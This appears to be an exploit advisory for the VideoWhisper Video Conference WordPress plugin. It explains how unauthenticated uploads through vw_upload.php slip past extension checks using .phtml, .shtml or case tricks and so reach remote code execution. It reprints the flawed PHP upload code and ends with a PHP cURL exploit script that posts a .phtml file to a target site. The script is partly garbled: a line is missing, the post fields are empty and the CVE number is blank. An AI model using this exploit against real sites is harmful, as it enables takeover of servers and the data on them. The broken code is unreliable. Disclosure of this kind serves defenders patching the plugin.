   Description: VideoWhisper Video Conference is a modern web based
   multiple way video chat and real time file sharing tool. Read more on
   WordPress Video Conference plugin home page.
   Vulnerability:
   *Update* You can directly execute php by uploading file extension
   ending in .phtml, .rhtml, .pht as long as the extension isn't defined
   in the apache mime.types. This was a previously discovered
   vulnerability that was not properly fixed by the author. The patch was
   insufficient in blocking malicious file uploads.
   ./videowhisper-video-conference-integration/vc/vw_upload.php Allows
   various remote unauthenticated file uploads, among the file types is
   html where the last 4 characters are only being checked in a file name
   to match which types are allowed. Because of this .shtml can be passed
   through and remote code execution is SSI is allowed. The code does not
   do any user access validation and therefore anyone can upload the
   following files to an unsuspecting wordpress site:
   .shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,
   .mp3,.flv,.avi,.mpg,.ppt,.pps The if (strstr($filename,'.php')) exit;
   can be by passed by using the extension .Php but the file extension
   check would allow files like test.Php.shtml <?php if ($_GET["room"])
   $room=$_GET["room"]; if ($_POST["room"]) $room=$_POST["room"];
   $filename=$_FILES['vw_file']['name']; include_once("incsan.php");
   sanV($room); if (!$room) exit; sanV($filename); if (!$filename) exit;
   if (strstr($filename,'.php')) exit; //do not allow uploads to other
   folders if ( strstr($room,"/") || strstr($room,"..") ) exit; if (
   strstr($filename,"/") || strstr($filename,"..") ) exit;
   $destination="uploads/".$room."/"; if ($_GET["slides"]) $destination .=
   "slides/"; $ext=strtolower(substr($filename,-4));
   $allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",
   ".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt","
   .pps"); if (in_array($ext,$allowed))
   move_uploaded_file($_FILES['vw_file']['tmp_name'], $destination .
   $filename); ?>loadstatus=1
   CVE-
   JSON: Export
   Exploit Code:

    1. <?php
    2.
    3. $uploadfile="upexp.phtml";
    4. $ch =
    5. curl_init("http://target_site/wp-content/plugins/videowhisper-video
       -conference-integration/vc/vw_upload.php");
    6. curl_setopt($ch, CURLOPT_POST, true);
    7. curl_setopt($ch, CURLOPT_POSTFIELDS,

       ;
    9. curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   10. $postResult = curl_exec($ch);
   11. curl_close($ch);
